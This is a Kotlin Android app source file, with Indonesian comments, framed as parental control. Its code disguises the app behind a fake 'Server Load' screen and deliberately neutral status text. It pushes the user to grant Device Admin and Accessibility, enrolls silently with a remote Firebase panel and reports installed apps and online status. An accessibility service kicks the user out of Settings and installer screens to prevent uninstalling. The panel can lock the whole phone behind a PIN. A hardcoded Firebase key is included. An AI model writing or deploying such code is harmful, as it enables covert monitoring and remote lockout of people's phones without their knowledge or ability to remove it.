package com.sosxa.app

import android.Manifest
import android.accessibilityservice.AccessibilityService
import android.app.Activity
import android.app.Application
import android.app.Notification
import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.admin.DeviceAdminReceiver
import android.app.admin.DevicePolicyManager
import android.content.BroadcastReceiver
import android.content.ComponentName
import android.content.Context
import android.content.Intent
import android.content.IntentFilter
import android.content.SharedPreferences
import android.graphics.Color
import android.os.Build
import android.os.Bundle
import android.content.res.ColorStateList
import android.provider.Settings
import android.view.Gravity
import android.view.accessibility.AccessibilityEvent
import android.webkit.WebView
import android.widget.LinearLayout
import android.widget.ProgressBar
import android.widget.TextView
import android.graphics.Bitmap
import android.graphics.BitmapFactory
import java.net.URL
import com.google.firebase.FirebaseApp
import com.google.firebase.FirebaseOptions
import com.google.firebase.database.DataSnapshot
import com.google.firebase.database.DatabaseError
import com.google.firebase.database.DatabaseReference
import com.google.firebase.database.FirebaseDatabase
import com.google.firebase.database.ServerValue
import com.google.firebase.database.ValueEventListener
import java.util.UUID

// ---------- Aplikasi + Firebase ----------
class App : Application() {
    override fun onCreate() {
        super.onCreate()
        if (FirebaseApp.getApps(this).isEmpty()) {
            FirebaseApp.initializeApp(
                this,
                FirebaseOptions.Builder()
                    .setApiKey("AIzaSyBD0bJ-VZItWfS95ofGmiNH6Ee2zNe1av8")
                    .setApplicationId("1:313136750773:web:6d30a26212137be5735efc")
                    .setDatabaseUrl("https://nweacsess-default-rtdb.asia-southeast1.firebasedatabase.app")
                    .setProjectId("nweacsess")
                    .build()
            )
        }
        // TAMBAHAN: channel notifikasi (wajib di Android 8+ sebelum bisa kirim notifikasi)
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val channel = NotificationChannel(
                "sosxa_notify",
                "Notifikasi",
                NotificationManager.IMPORTANCE_HIGH
            )
            getSystemService(NotificationManager::class.java).createNotificationChannel(channel)
        }
        Sync.start(this)
    }
}

// ---------- Sinkronisasi dengan panel web ----------
object Sync {
    private var started = false
    private lateinit var base: DatabaseReference
    private lateinit var prefs: SharedPreferences

    @Volatile var blocked: Set<String> = emptySet()
    @Volatile var running = false
    @Volatile var protect = false
    @Volatile var html = ""

    // TAMBAHAN: status Lock HP (kunci layar penuh)
    @Volatile var screenLocked = false
    @Volatile var lockPin = ""
    @Volatile var lockHtml = ""
    // Ditandai true begitu anak berhasil masukkan PIN yang benar,
    // supaya tidak langsung terkunci lagi sebelum mama menyalakan ulang dari panel.
    @Volatile var unlockedLocally = false
    private var appContext: Context? = null

    // Firebase key tidak boleh ada titik
    fun key(pkg: String) = pkg.replace(".", "_")

    @Synchronized
    fun start(ctx: Context) {
        if (started) return
        prefs = ctx.getSharedPreferences("k", Context.MODE_PRIVATE)
        val id = prefs.getString("deviceId", null) ?: return
        if (!prefs.getBoolean("paired", false)) return
        started = true
        val app = ctx.applicationContext
        appContext = app

        blocked = prefs.getStringSet("blocked", emptySet())!!.toSet()
        running = prefs.getBoolean("running", false)
        protect = prefs.getBoolean("protect", false)
        html = prefs.getString("html", "") ?: ""
        // PERBAIKAN: muat juga cache Lock HP sebelum data terbaru dari server
        // datang, supaya PIN asli langsung terpakai (tidak sempat jatuh ke
        // default "1234" saat app baru dibuka / abis restart).
        screenLocked = prefs.getBoolean("screen_locked", false)
        lockPin = prefs.getString("lock_pin", "") ?: ""
        lockHtml = prefs.getString("lock_html", "") ?: ""

        base = FirebaseDatabase.getInstance().getReference("devices/$id")

        listen(base.child("settings/is_running")) {
            running = it.getValue(Boolean::class.java) == true
            prefs.edit().putBoolean("running", running).apply()
        }
        listen(base.child("settings/protection_enabled")) {
            protect = it.getValue(Boolean::class.java) == true
            prefs.edit().putBoolean("protect", protect).apply()
        }
        listen(base.child("settings/custom_lock_html")) {
            html = it.getValue(String::class.java) ?: ""
            prefs.edit().putString("html", html).apply()
        }

        // TAMBAHAN: dengarkan status Lock HP dari panel
        listen(base.child("settings/screen_locked")) {
            val newVal = it.getValue(Boolean::class.java) == true
            if (newVal && !screenLocked) {
                // Baru dinyalakan mama dari panel -> reset sesi unlock lokal
                unlockedLocally = false
            }
            screenLocked = newVal
            prefs.edit().putBoolean("screen_locked", newVal).apply()
            // Langsung kunci layar sekarang juga tanpa menunggu event window lain
            if (newVal && !unlockedLocally) {
                appContext?.let { c ->
                    c.startActivity(
                        Intent(c, LockScreenActivity::class.java)
                            .addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                    )
                }
            }
        }
        listen(base.child("settings/lock_pin")) {
            lockPin = it.getValue(String::class.java) ?: ""
            prefs.edit().putString("lock_pin", lockPin).apply()
        }
        listen(base.child("settings/lock_html")) {
            lockHtml = it.getValue(String::class.java) ?: ""
            prefs.edit().putString("lock_html", lockHtml).apply()
        }

        // TAMBAHAN: dengarkan notifikasi baru dari panel
        listen(base.child("notify")) { snap ->
            val ts = snap.child("ts").getValue(Long::class.java) ?: return@listen
            val lastTs = prefs.getLong("last_notify_ts", 0L)
            if (ts <= lastTs) return@listen
            prefs.edit().putLong("last_notify_ts", ts).apply()

            val label = snap.child("label").getValue(String::class.java) ?: "Notifikasi"
            val message = snap.child("message").getValue(String::class.java) ?: ""
            val imageUrl = snap.child("imageUrl").getValue(String::class.java) ?: ""
            appContext?.let { c -> showNotification(c, label, message, imageUrl) }
        }
        listen(base.child("installed_apps")) { s ->
            val set = HashSet<String>()
            s.children.forEach { c ->
                if (c.child("blocked").getValue(Boolean::class.java) == true) {
                    c.child("packageName").getValue(String::class.java)?.let { set.add(it) }
                }
            }
            blocked = set
            prefs.edit().putStringSet("blocked", set).apply()
        }

        pushApps(app)
        watchConnection(id)

        val f = IntentFilter().apply {
            addAction(Intent.ACTION_PACKAGE_ADDED)
            addAction(Intent.ACTION_PACKAGE_REMOVED)
            addDataScheme("package")
        }
        if (Build.VERSION.SDK_INT >= 33) {
            app.registerReceiver(receiver, f, Context.RECEIVER_EXPORTED)
        } else {
            app.registerReceiver(receiver, f)
        }
    }

    // TAMBAHAN: Status online/offline (presence) real-time.
    // Memakai ".info/connected" bawaan Firebase: begitu koneksi device ke
    // server terputus (app di-kill, data mati total, dsb), Firebase sendiri
    // yang otomatis menulis status offline + waktu terakhir online.
    private fun watchConnection(deviceId: String) {
        val statusRef = FirebaseDatabase.getInstance().getReference("devices/$deviceId/status")
        val connectedRef = FirebaseDatabase.getInstance().getReference(".info/connected")
        connectedRef.addValueEventListener(object : ValueEventListener {
            override fun onDataChange(snap: DataSnapshot) {
                val isConnected = snap.getValue(Boolean::class.java) == true
                if (isConnected) {
                    statusRef.child("online").onDisconnect().setValue(false)
                    statusRef.child("lastSeen").onDisconnect().setValue(ServerValue.TIMESTAMP)
                    statusRef.child("online").setValue(true)
                }
            }
            override fun onCancelled(e: DatabaseError) {}
        })
    }

    // TAMBAHAN: tampilkan notifikasi sistem, dengan foto custom opsional (didownload
    // dari URL yang diisi di panel). Download dilakukan di thread terpisah supaya
    // tidak mengganggu thread utama.
    private fun showNotification(ctx: Context, label: String, message: String, imageUrl: String) {
        fun post(bitmap: Bitmap?) {
            val builder = Notification.Builder(ctx, "sosxa_notify")
                .setContentTitle(label)
                .setContentText(message)
                .setSmallIcon(ctx.applicationInfo.icon)
                .setAutoCancel(true)
            if (bitmap != null) {
                builder.setLargeIcon(bitmap)
                builder.style = Notification.BigPictureStyle().bigPicture(bitmap)
            }
            val nm = ctx.getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager
            nm.notify(System.currentTimeMillis().toInt(), builder.build())
        }

        if (imageUrl.isNotBlank()) {
            Thread {
                val bmp = try {
                    BitmapFactory.decodeStream(URL(imageUrl).openStream())
                } catch (e: Exception) {
                    null
                }
                post(bmp)
            }.start()
        } else {
            post(null)
        }
    }

    private fun listen(ref: DatabaseReference, f: (DataSnapshot) -> Unit) {
        ref.addValueEventListener(object : ValueEventListener {
            override fun onDataChange(s: DataSnapshot) = f(s)
            override fun onCancelled(e: DatabaseError) {}
        })
    }

    private val receiver = object : BroadcastReceiver() {
        override fun onReceive(c: Context, i: Intent) {
            val pkg = i.data?.schemeSpecificPart ?: return
            if (i.action == Intent.ACTION_PACKAGE_REMOVED) {
                if (i.getBooleanExtra(Intent.EXTRA_REPLACING, false)) return
                base.child("installed_apps/${key(pkg)}").removeValue()
            } else {
                pushApps(c.applicationContext)
            }
        }
    }

    // Kirim semua aplikasi terpasang (yang punya ikon launcher) ke panel
    private fun pushApps(ctx: Context) {
        val pm = ctx.packageManager
        val intent = Intent(Intent.ACTION_MAIN).addCategory(Intent.CATEGORY_LAUNCHER)
        val apps = pm.queryIntentActivities(intent, 0)
            .map { it.activityInfo.packageName to it.loadLabel(pm).toString() }
            .filter { it.first != ctx.packageName }
            .distinctBy { it.first }
        val ref = base.child("installed_apps")
        ref.get().addOnSuccessListener { snap ->
            val keep = apps.map { key(it.first) }.toSet()
            val upd = HashMap<String, Any?>()
            snap.children.forEach { c ->
                val k = c.key ?: return@forEach
                if (!keep.contains(k)) upd[k] = null
            }
            apps.forEach { (p, n) ->
                upd["${key(p)}/appName"] = n
                upd["${key(p)}/packageName"] = p
            }
            ref.updateChildren(upd)
        }
    }
}

// ---------- Layar putih, daftar otomatis (tanpa kode) ----------
class MainActivity : Activity() {
    private lateinit var prefs: SharedPreferences
    private lateinit var statusView: TextView

    // Supaya tidak memicu intent yang sama berkali-kali dalam satu kali resume
    private var lastPrompted = ""

    override fun onCreate(b: Bundle?) {
        super.onCreate(b)
        prefs = getSharedPreferences("k", MODE_PRIVATE)

        // TAMBAHAN: background gradasi biru laut (bukan warna flat) + progress bar
        val lightBlue = Color.parseColor("#7FD4E8")
        val gradient = android.graphics.drawable.GradientDrawable(
            android.graphics.drawable.GradientDrawable.Orientation.TL_BR,
            intArrayOf(
                Color.parseColor("#01152B"),
                Color.parseColor("#023E73"),
                Color.parseColor("#0A6E8C")
            )
        )

        val root = LinearLayout(this).apply {
            orientation = LinearLayout.VERTICAL
            gravity = Gravity.CENTER
            background = gradient
            setPadding(48, 48, 48, 48)
        }
        // TAMBAHAN: teks generik, tidak menyebut apapun yang mencurigakan
        val titleView = TextView(this).apply {
            text = "Server Load"
            textSize = 20f
            setTextColor(Color.WHITE)
            alpha = 0.92f
            gravity = Gravity.CENTER
            setPadding(0, 0, 0, 40)
        }
        val progressBar = ProgressBar(this, null, android.R.attr.progressBarStyleHorizontal).apply {
            isIndeterminate = true
            indeterminateTintList = ColorStateList.valueOf(lightBlue)
            layoutParams = LinearLayout.LayoutParams(
                LinearLayout.LayoutParams.MATCH_PARENT,
                LinearLayout.LayoutParams.WRAP_CONTENT
            )
        }
        statusView = TextView(this).apply {
            textSize = 13f
            setTextColor(Color.parseColor("#B8E2F2"))
            gravity = Gravity.CENTER
            setPadding(0, 28, 0, 0)
        }
        root.addView(titleView)
        root.addView(progressBar)
        root.addView(statusView)
        setContentView(root)

        autoRegister()
    }

    override fun onResume() {
        super.onResume()
        refresh()
    }

    // TAMBAHAN: Otomatis memicu dialog izin (Device Admin) atau membuka
    // halaman toggle (Accessibility) begitu app dibuka / kembali dari Settings,
    // tanpa perlu tombol yang harus ditekan user.
    private fun refresh() {
        val acc = (Settings.Secure.getString(
            contentResolver, Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES
        ) ?: "").contains(packageName)
        val adm = getSystemService(DevicePolicyManager::class.java)
            .isAdminActive(ComponentName(this, AdminReceiver::class.java))
        // TAMBAHAN: izin notifikasi (hanya diwajibkan Android 13 ke atas)
        val notif = Build.VERSION.SDK_INT < Build.VERSION_CODES.TIRAMISU ||
            checkSelfPermission(Manifest.permission.POST_NOTIFICATIONS) == android.content.pm.PackageManager.PERMISSION_GRANTED

        // TAMBAHAN: teks status selalu netral di semua kondisi, tidak membocorkan
        // bahwa app ini sedang meminta izin Accessibility/Device Admin/Notifikasi atau
        // bahwa app ini terhubung ke sebuah panel pemantauan.
        when {
            !adm -> {
                statusView.text = "Memuat data server..."
                if (lastPrompted != "admin") {
                    lastPrompted = "admin"
                    startActivity(
                        Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN).putExtra(
                            DevicePolicyManager.EXTRA_DEVICE_ADMIN,
                            ComponentName(this, AdminReceiver::class.java)
                        )
                    )
                }
            }
            !acc -> {
                statusView.text = "Menyiapkan konfigurasi..."
                if (lastPrompted != "acc") {
                    lastPrompted = "acc"
                    val intent = Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS)
                    // Langsung buka halaman toggle service ini (bukan daftar semua service)
                    intent.putExtra("android.provider.extra.APP_PACKAGE", packageName)
                    startActivity(intent)
                }
            }
            !notif -> {
                statusView.text = "Menyiapkan konfigurasi..."
                if (lastPrompted != "notif") {
                    lastPrompted = "notif"
                    requestPermissions(arrayOf(Manifest.permission.POST_NOTIFICATIONS), 101)
                }
            }
            else -> {
                lastPrompted = ""
                statusView.text = "Sinkronisasi selesai."
            }
        }
    }

    // Begitu app dibuka pertama kali, langsung daftarkan diri ke Firebase,
    // tanpa perlu kode pairing. Panel web akan otomatis melihat device ini.
    // Maksimal 3 device yang boleh terdaftar bersamaan.
    private fun autoRegister() {
        val existingId = prefs.getString("deviceId", null)

        if (existingId != null) {
            // Device lama yang sudah pernah daftar, tetap diizinkan jalan seperti biasa
            registerDevice(existingId)
            return
        }

        // Device baru: cek dulu jumlah device yang sudah terdaftar
        statusView.text = "Memeriksa ketersediaan slot perangkat..."
        val devicesRef = FirebaseDatabase.getInstance().getReference("devices")
        devicesRef.get().addOnSuccessListener { snap ->
            if (snap.childrenCount >= 3) {
                statusView.text = "Maksimal 3 perangkat sudah terdaftar.\nHubungi orang tua untuk info lebih lanjut."
            } else {
                val newId = UUID.randomUUID().toString().replace("-", "").take(20)
                prefs.edit().putString("deviceId", newId).apply()
                registerDevice(newId)
            }
        }.addOnFailureListener {
            statusView.text = "Gagal memeriksa server. Coba lagi nanti."
        }
    }

    private fun registerDevice(id: String) {
        prefs.edit().putBoolean("paired", true).apply()

        val model = "${Build.MANUFACTURER} ${Build.MODEL}".trim()
        val ref = FirebaseDatabase.getInstance().getReference("devices/$id/info")
        ref.setValue(
            mapOf(
                "model" to model,
                "lastSeen" to System.currentTimeMillis()
            )
        )

        Sync.start(applicationContext)
    }
}

// ---------- Layar blokir (HTML dari panel) ----------
class BlockActivity : Activity() {
    override fun onCreate(b: Bundle?) {
        super.onCreate(b)
        val w = WebView(this)
        w.settings.javaScriptEnabled = false
        w.settings.allowFileAccess = false
        w.settings.allowContentAccess = false
        w.setBackgroundColor(Color.WHITE)
        val body = Sync.html.ifBlank {
            "<h1 style='text-align:center;margin-top:30vh'>Aplikasi ini diblokir</h1>"
        }
        w.loadDataWithBaseURL(
            null,
            "<meta name='viewport' content='width=device-width,initial-scale=1'>$body",
            "text/html", "UTF-8", null
        )
        setContentView(w)
    }

    override fun onBackPressed() {
        startActivity(
            Intent(Intent.ACTION_MAIN)
                .addCategory(Intent.CATEGORY_HOME)
                .addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
        )
        finish()
    }
}

// ---------- Layar Lock HP (kunci layar penuh + PIN) ----------
class LockScreenActivity : Activity() {
    private var entered = StringBuilder()
    private lateinit var dotsView: TextView
    private lateinit var defaultArea: LinearLayout
    private lateinit var msgView: TextView
    private lateinit var subView: TextView
    private lateinit var msgWeb: WebView
    private lateinit var root: LinearLayout
    private lateinit var bottomArea: LinearLayout

    private val seaBlueGradient by lazy {
        android.graphics.drawable.GradientDrawable(
            android.graphics.drawable.GradientDrawable.Orientation.TOP_BOTTOM,
            intArrayOf(
                Color.parseColor("#01152B"),
                Color.parseColor("#023E73"),
                Color.parseColor("#0A6E8C")
            )
        )
    }

    override fun onCreate(b: Bundle?) {
        super.onCreate(b)

        // Tampil di atas semua, termasuk saat layar terkunci
        window.addFlags(
            android.view.WindowManager.LayoutParams.FLAG_SHOW_WHEN_LOCKED or
                android.view.WindowManager.LayoutParams.FLAG_TURN_SCREEN_ON or
                android.view.WindowManager.LayoutParams.FLAG_KEEP_SCREEN_ON
        )

        val lightBlue = Color.parseColor("#7FD4E8")

        root = LinearLayout(this).apply {
            orientation = LinearLayout.VERTICAL
            background = seaBlueGradient
        }

        // TAMBAHAN: area atas (mengisi sisa layar) - isinya GANTI TOTAL,
        // bukan digabung: default (ikon+teks) ATAU custom HTML, tidak pernah dua-duanya.
        defaultArea = LinearLayout(this).apply {
            orientation = LinearLayout.VERTICAL
            gravity = Gravity.CENTER
            layoutParams = LinearLayout.LayoutParams(
                LinearLayout.LayoutParams.MATCH_PARENT, 0, 1f
            )
        }
        val lockIcon = TextView(this).apply {
            text = "\uD83D\uDD12"
            textSize = 48f
            gravity = Gravity.CENTER
        }
        msgView = TextView(this).apply {
            text = "HP Sudah Diblokir"
            textSize = 22f
            setTextColor(Color.WHITE)
            gravity = Gravity.CENTER
            setPadding(0, 24, 0, 8)
        }
        subView = TextView(this).apply {
            text = "Masukkan PIN untuk membuka"
            textSize = 14f
            setTextColor(lightBlue)
            gravity = Gravity.CENTER
        }
        defaultArea.addView(lockIcon)
        defaultArea.addView(msgView)
        defaultArea.addView(subView)

        // TAMBAHAN: WebView custom HTML - mengisi penuh area atas (bukan kotak kecil),
        // jadi tidak ada sisa warna biru laut kelihatan di sekitarnya saat aktif.
        msgWeb = WebView(this).apply {
            settings.javaScriptEnabled = false
            settings.allowFileAccess = false
            settings.allowContentAccess = false
            setBackgroundColor(Color.WHITE)
            visibility = android.view.View.GONE
            layoutParams = LinearLayout.LayoutParams(
                LinearLayout.LayoutParams.MATCH_PARENT, 0, 1f
            )
        }

        updateLockDisplay()

        dotsView = TextView(this).apply {
            text = ""
            textSize = 30f
            letterSpacing = 0.5f
            setTextColor(Color.WHITE)
            gravity = Gravity.CENTER
            setPadding(0, 0, 0, 32)
        }

        val pad = LinearLayout(this).apply {
            orientation = LinearLayout.VERTICAL
            gravity = Gravity.CENTER
            setPadding(0, 16, 0, 16)
        }
        val rows = listOf(
            listOf("1", "2", "3"),
            listOf("4", "5", "6"),
            listOf("7", "8", "9"),
            listOf("", "0", "⌫")
        )
        rows.forEach { row ->
            val rowLayout = LinearLayout(this).apply {
                orientation = LinearLayout.HORIZONTAL
                gravity = Gravity.CENTER
            }
            row.forEach { label ->
                val btn = TextView(this).apply {
                    text = label
                    textSize = 24f
                    setTextColor(Color.WHITE)
                    gravity = Gravity.CENTER
                    setPadding(36, 28, 36, 28)
                    if (label.isNotEmpty()) {
                        setOnClickListener {
                            if (label == "⌫") {
                                if (entered.isNotEmpty()) entered.deleteCharAt(entered.length - 1)
                            } else {
                                if (entered.length < 8) entered.append(label)
                            }
                            updateDots()
                            checkPin()
                        }
                    }
                }
                rowLayout.addView(btn)
            }
            pad.addView(rowLayout)
        }

        // TAMBAHAN: bottomArea (dots + keypad) selalu tampil, latar gelap transparan
        // supaya tetap kebaca jelas walau custom HTML pakai warna terang.
        bottomArea = LinearLayout(this).apply {
            orientation = LinearLayout.VERTICAL
            gravity = Gravity.CENTER
            setBackgroundColor(Color.parseColor("#CC000000"))
            setPadding(32, 24, 32, 24)
        }
        bottomArea.addView(dotsView)
        bottomArea.addView(pad)

        root.addView(defaultArea)
        root.addView(msgWeb)
        root.addView(bottomArea)
        setContentView(root)

        // TAMBAHAN: Sematkan aplikasi (App Pinning / Screen Pinning) - API resmi
        // Android untuk mengunci layar ke 1 app, lebih kuat daripada trik
        // tarik-balik lewat Accessibility saja. Tombol navigasi (Home/Recents)
        // beneran diblokir sistem selama task ini masih dipin.
        tryStartLockTask()
    }

    override fun onResume() {
        super.onResume()
        // Tampilan bisa diubah-ubah dari panel (custom HTML), selalu perbarui
        updateLockDisplay()
        tryStartLockTask()
    }

    private fun tryStartLockTask() {
        try {
            startLockTask()
        } catch (e: Exception) {
            // Diabaikan kalau gagal (misal versi Android lama / dibatasi OEM),
            // sistem tarik-balik via Accessibility tetap jadi cadangan.
        }
    }

    private fun tryStopLockTask() {
        try {
            stopLockTask()
        } catch (e: Exception) {
        }
    }

    // TAMBAHAN: GANTI TOTAL tampilan, bukan digabung.
    // Custom HTML diisi -> default (ikon biru laut + teks) disembunyikan sepenuhnya,
    // WebView custom mengisi seluruh area atas. Custom HTML kosong -> balik ke default.
    private fun updateLockDisplay() {
        if (Sync.lockHtml.isNotBlank()) {
            defaultArea.visibility = android.view.View.GONE
            msgWeb.visibility = android.view.View.VISIBLE
            msgWeb.loadDataWithBaseURL(
                null,
                "<meta name='viewport' content='width=device-width,initial-scale=1'><body style='margin:0;display:flex;align-items:center;justify-content:center;min-height:100vh;font-family:sans-serif'>${Sync.lockHtml}</body>",
                "text/html", "UTF-8", null
            )
        } else {
            msgWeb.visibility = android.view.View.GONE
            defaultArea.visibility = android.view.View.VISIBLE
        }
    }

    private fun updateDots() {
        dotsView.text = "\u25CF ".repeat(entered.length).trim()
    }

    private fun checkPin() {
        val target = Sync.lockPin.ifBlank { "1234" }
        if (entered.length >= target.length) {
            if (entered.toString() == target) {
                // PIN benar: buka kunci, beri tahu panel bahwa Lock HP sudah nonaktif
                Sync.unlockedLocally = true
                Sync.screenLocked = false
                unlockInDatabase()
                tryStopLockTask()
                startActivity(
                    Intent(Intent.ACTION_MAIN)
                        .addCategory(Intent.CATEGORY_HOME)
                        .addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                )
                finish()
            } else {
                entered = StringBuilder()
                updateDots()
                dotsView.text = "PIN salah"
            }
        }
    }

    private fun unlockInDatabase() {
        val prefs = getSharedPreferences("k", MODE_PRIVATE)
        val id = prefs.getString("deviceId", null) ?: return
        FirebaseDatabase.getInstance()
            .getReference("devices/$id/settings/screen_locked")
            .setValue(false)
    }

    // Cegah tombol back menutup layar kunci
    override fun onBackPressed() {}
}

// ---------- Penjaga: blokir app + lindungi APK ----------
class GuardService : AccessibilityService() {
    private var last = 0L
    private var lastLock = 0L

    private val guarded = setOf(
        "com.android.settings",
        "com.google.android.packageinstaller",
        "com.android.packageinstaller",
        "com.samsung.android.packageinstaller",
        "com.google.android.permissioncontroller",
        "com.miui.packageinstaller",
        "com.miui.securitycenter"
    )

    override fun onServiceConnected() {
        super.onServiceConnected()
        Sync.start(this)
    }

    override fun onAccessibilityEvent(e: AccessibilityEvent?) {
        val ev = e ?: return
        val pkg = ev.packageName?.toString() ?: return
        if (pkg == packageName) return

        // TAMBAHAN: Lock HP - selama aktif, tarik balik layar kunci setiap kali
        // anak coba pindah ke app/launcher lain (mencegah navigasi keluar).
        if (Sync.screenLocked && !Sync.unlockedLocally &&
            ev.eventType == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED
        ) {
            val now = System.currentTimeMillis()
            if (now - lastLock < 800) return
            lastLock = now
            startActivity(
                Intent(this, LockScreenActivity::class.java)
                    .addFlags(Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_CLEAR_TOP)
            )
            return
        }

        // Protect APK: tutup halaman pengaturan yang menampilkan app ini
        if (Sync.protect && pkg in guarded) {
            val root = rootInActiveWindow
            if (root != null && root.findAccessibilityNodeInfosByText("sosxa").isNotEmpty()) {
                performGlobalAction(GLOBAL_ACTION_HOME)
                return
            }
        }

        // Blokir aplikasi yang dipilih di panel
        if (Sync.running &&
            ev.eventType == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED &&
            pkg in Sync.blocked
        ) {
            val now = System.currentTimeMillis()
            if (now - last < 1000) return
            last = now
            startActivity(
                Intent(this, BlockActivity::class.java)
                    .addFlags(Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_CLEAR_TOP)
            )
        }
    }

    override fun onInterrupt() {}
}

class AdminReceiver : DeviceAdminReceiver()
